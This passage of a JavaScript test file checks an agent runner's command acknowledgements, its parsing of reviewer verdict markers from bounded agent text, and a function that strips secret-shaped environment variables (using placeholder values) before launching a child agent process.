    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
  });

  it('acknowledges definite local rejection as failed', async () => {
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
    runtime.prompt.mockRejectedValueOnce(new Error('ACP session is not ready for a prompt'));
    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'bad', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'bad', 'failed', expect.objectContaining({ error: expect.any(String) }), transportOptions());
  });

  it('acknowledges ambiguous transport application as uncertain and fails the claim transiently', async () => {
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
    runtime.prompt.mockRejectedValueOnce(new Error('ACP prompt acceptance is uncertain'));
    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'ambiguous', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'ambiguous', 'uncertain', expect.objectContaining({ error: expect.any(String) }), transportOptions());
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });
});

describe('review output', () => {
  it.each([
    ['<!-- reviewer-result: { "status": "FAIL" } -->', 'fail'],
    ['<!-- reviewer-result: { "status": "PASS" } -->', 'pass'],
  ])('derives %s verdict from normalized bounded agent text', async (text, verdict) => {
    const runtime = fakeRuntime();
    const { api } = await runClaim({
      work: { ...WORK, claim_type: 'review' },
      runtime,
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text } } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed', verdict }));
  });

  it('bounds normalized agent text so an evicted verdict marker cannot affect the report', async () => {
    const runtime = fakeRuntime();
    const marker = '<!-- reviewer-result: { "status": "FAIL" } -->';
    const { api } = await runClaim({
      work: { ...WORK, claim_type: 'review' },
      runtime,
      runnerOptions: { agentTextLimitBytes: 64 },
      runtimeFactory: vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(async () => {
          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: `${marker}${'x'.repeat(128)}` } } });
          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
        });
        return runtime;
      }),
    });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
    expect(api.reportClaim.mock.calls[0][0]).not.toHaveProperty('verdict');
  });
});

describe('sanitizeChildEnv', () => {
  it('strips every secret-shaped variable before passing to the ACP child', () => {
    const sanitized = sanitizeChildEnv({
      PATH: '/usr/bin',
      HOME: '/home/node',
      LANG: 'en_US.UTF-8',
      GITHUB_TOKEN: 'ghp_SECRET',
      ANTHROPIC_API_KEY: 'sk-ant-SECRET',
      MY_SECRET: 'xxxx',
      MY_PASSWORD: 'hunter2',
      SIGNING_KEY: 'pem-content',
      DB_CREDENTIAL: 'user:pass',
      PRIVATE_KEY: 'pem',
    });
    expect(sanitized).toEqual({
      PATH: '/usr/bin',
      HOME: '/home/node',
      LANG: 'en_US.UTF-8',
    });
    expect(sanitized).not.toHaveProperty('GITHUB_TOKEN');
    expect(sanitized).not.toHaveProperty('ANTHROPIC_API_KEY');
    expect(sanitized).not.toHaveProperty('MY_SECRET');
    expect(sanitized).not.toHaveProperty('MY_PASSWORD');
    expect(sanitized).not.toHaveProperty('SIGNING_KEY');
    expect(sanitized).not.toHaveProperty('DB_CREDENTIAL');
    expect(sanitized).not.toHaveProperty('PRIVATE_KEY');
  });

  it('skips non-string values entirely (defense against serialization surprises)', () => {
    const sanitized = sanitizeChildEnv({
      PATH: '/usr/bin',
      NUMERIC: 42,
      NULLISH: null,
      UNDEF: undefined,
    });
    expect(sanitized).toEqual({ PATH: '/usr/bin' });
  });
});
